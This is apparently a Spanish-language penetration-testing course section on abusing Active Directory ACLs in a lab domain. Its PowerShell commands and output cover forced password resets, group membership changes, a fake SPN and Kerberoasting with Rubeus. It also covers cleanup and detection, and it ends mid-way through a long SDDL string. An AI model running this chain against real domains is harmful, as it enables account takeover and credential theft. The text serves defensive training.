## Abusing ACLs

Una vez más, para recapitular dónde estamos y a dónde queremos llegar. Tenemos el control del usuario `wley` cuyo hash NTLMv2 recuperamos ejecutando Responder anteriormente en la evaluación. Afortunadamente para nosotros, este usuario estaba usando una contraseña débil, y pudimos descifrar el hash offline usando Hashcat y recuperar el valor en texto claro. Sabemos que podemos usar este acceso para iniciar una cadena de ataque que resultará en que tomemos el control del usuario `adunn`, quien puede realizar el ataque DCSync, lo que nos daría control total del dominio al permitirnos recuperar los hashes de contraseña NTLM para todos los usuarios en el dominio y escalar privilegios a Admin de Dominio/Empresa e incluso lograr persistencia. Para realizar la cadena de ataque, debemos hacer lo siguiente:

1. Usar el usuario `wley` para cambiar la contraseña del usuario `damundsen`
2. Autenticarnos como el usuario `damundsen` y aprovechar los derechos `GenericAll` para agregar un usuario que controlamos al grupo `Help Desk Level 1`
3. Aprovechar la membresía de grupo anidada en el grupo `Information Technology` y utilizar los derechos `GenericAll` para tomar el control del usuario `adunn`

Entonces, primero, debemos autenticarnos como `wley` y forzar el cambio de contraseña del usuario `damundsen`. Podemos comenzar abriendo una consola de PowerShell y autenticándonos como el usuario `wley`. De lo contrario, podríamos omitir este paso si ya estamos ejecutando como este usuario. Para hacer esto, podemos crear un [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0).

### Creating a PSCredential Object

```r
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

A continuación, debemos crear un [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) que represente la contraseña que queremos establecer para el usuario objetivo `damundsen`.

### Creating a SecureString Object

```r
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Finalmente, usaremos la función [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) de PowerView para cambiar la contraseña del usuario. Necesitamos usar la flag `-Credential` con el objeto de credencial que creamos para el usuario `wley`. Es mejor especificar siempre la flag `-Verbose` para obtener retroalimentación sobre la finalización del comando según lo esperado o tanta información como sea posible sobre errores. Podríamos hacer esto desde un host de ataque Linux usando una herramienta como `pth-net`, que es parte del [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).

### Changing the User's Password

```r
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

Podemos ver que el comando se completó con éxito, cambiando la contraseña para el usuario objetivo mientras usamos las credenciales que especificamos para el usuario `wley` que controlamos. A continuación, necesitamos realizar un proceso similar para autenticarnos como el usuario `damundsen` y agregarnos al grupo `Help Desk Level 1`.

### Creating a SecureString Object using damundsen

```r
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

A continuación, podemos usar la función [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) para agregarnos al grupo objetivo. Primero podemos confirmar que nuestro usuario no es miembro del grupo objetivo. Esto también se podría hacer desde un host Linux usando el `pth-toolkit`.

### Adding damundsen to the Help Desk Level 1 Group

```r
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

```r
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

Una verificación rápida muestra que nuestra adición al grupo fue exitosa.

### Confirming damundsen was Added to the Group

```r
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne
```

En este punto, deberíamos poder aprovechar nuestra nueva membresía en el grupo para tomar el control del usuario `adunn`. Ahora, digamos que nuestro cliente nos permitió cambiar la contraseña del usuario `damundsen`, pero el usuario `adunn` es una cuenta de administrador que no puede ser interrumpida. Dado que tenemos derechos `GenericAll` sobre esta cuenta, podemos divertirnos aún más y realizar un ataque Kerberoasting dirigido modificando el atributo [servicePrincipalName](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) de la cuenta para crear un SPN falso que luego podemos Kerberoast para obtener el ticket TGS y (con suerte) descifrar el hash offline usando Hashcat.

Debemos estar autenticados como miembro del grupo `Information Technology` para que esto sea exitoso. Dado que agregamos a `damundsen` al grupo `Help Desk Level 1`, heredamos derechos a través de la membresía de grupo anidada. Ahora podemos usar [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) para crear el SPN falso. Podríamos usar la herramienta [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) para realizar este mismo ataque desde un host Linux, y creará un SPN temporal, recuperará el hash y eliminará el SPN temporal todo en un solo comando.

### Creating a Fake SPN

```r
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

Si esto funcionó, deberíamos poder Kerberoast el usuario usando cualquiera de los métodos y obtener el hash para descifrado offline. Hagamos esto con Rubeus.

### Kerberoasting with Rubeus

```r
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

¡Genial! Hemos obtenido el hash con éxito. El último paso es intentar descifrar la contraseña offline usando Hashcat. Una vez que tengamos la contraseña en texto claro, podríamos autenticarnos como el usuario `adunn` y realizar el ataque DCSync, que cubriremos en la siguiente sección.

---

## Cleanup

En términos de limpieza, hay algunas cosas que necesitamos hacer:

1. Eliminar el SPN falso que creamos en el usuario `adunn`.
2. Eliminar al usuario `damundsen` del grupo `Help Desk Level 1`
3. Restablecer la contraseña del usuario `damundsen` a su valor original (si lo sabemos) o hacer que nuestro cliente la restablezca/alerte al usuario

Este orden es importante porque si eliminamos al usuario del grupo primero, entonces no tendremos los derechos para eliminar el SPN falso.

Primero, eliminemos el SPN falso de la cuenta `adunn`.

### Removing the Fake SPN from adunn's Account

```r
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

A continuación, eliminaremos al usuario del grupo usando la función `Remove-DomainGroupMember`.

### Removing damundsen from the Help Desk Level 1 Group

```r
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

Podemos confirmar que el usuario fue efectivamente eliminado:

### Confirming damundsen was Removed from the Group

```r
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

Aunque realizamos tanta limpieza como fue posible, aún debemos incluir cada modificación que hagamos en nuestro informe final de evaluación. Nuestro cliente querrá estar al tanto de cualquier cambio dentro del entorno, y registrar todo lo que hacemos durante una evaluación por escrito ayuda a nuestro cliente y a nosotros en caso de que surjan preguntas.

Este es solo un ejemplo de ruta de ataque. Podría haber muchas rutas de ataque en un dominio grande, algunas más cortas y otras más complicadas. Si bien esta ruta fue ficticia para este entorno de laboratorio específico, he visto rutas de ataque similares durante compromisos en el mundo real, y los ataques de ACL a menudo entran en juego para avanzar en el acceso. A veces, sin embargo, una cadena de ataque de ACL puede ser demasiado lenta o potencialmente destructiva, por lo que podemos preferir enumerar la ruta para presentar a nuestro cliente con suficiente evidencia para comprender el problema y realizar la remediación.

---

## Detection and Remediation

Algunas recomendaciones sobre ACLs incluyen:

1. `Auditing for and removing dangerous ACLs`

Las organizaciones deben realizar auditorías regulares de AD, pero también capacitar al personal interno para ejecutar herramientas como BloodHound e identificar ACLs potencialmente peligrosos que pueden ser eliminados.

2. `Monitor group membership`

La visibilidad en los grupos importantes es primordial. Todos los grupos de alto impacto en el dominio deben ser monitoreados para alertar al personal de TI sobre cambios que podrían ser indicativos de una cadena de ataque de ACL.

3. `Audit and monitor for ACL changes`

Habilitar la [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) puede ayudar a detectar cambios no deseados, especialmente [Event ID 5136: A directory service object was modified](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136) que indicaría que el objeto de dominio fue modificado, lo que podría ser indicativo de un intento de ataque de ACL. Si revisamos el registro de eventos después de modificar la ACL del objeto de dominio, veremos algunos eventos ID `5136` creados:

### Viewing Event ID 5136

![image](https://academy.hackthebox.com/storage/modules/143/event5136.png)

Si revisamos la pestaña `Details`, podemos ver que la información pertinente está escrita en [Security Descriptor Definition Language (SDDL)](https://docs.microsoft.com/en

-us/windows/win32/secauthz/security-descriptor-definition-language) que no es legible por humanos.

### Viewing Associated SDDL

![image](https://academy.hackthebox.com/storage/modules/143/event5136_sddl.png)

Podemos usar el [cmdlet ConvertFrom-SddlString](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) para convertir esto a un formato legible.

### Converting the SDDL String into a Readable Format

```r
PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a41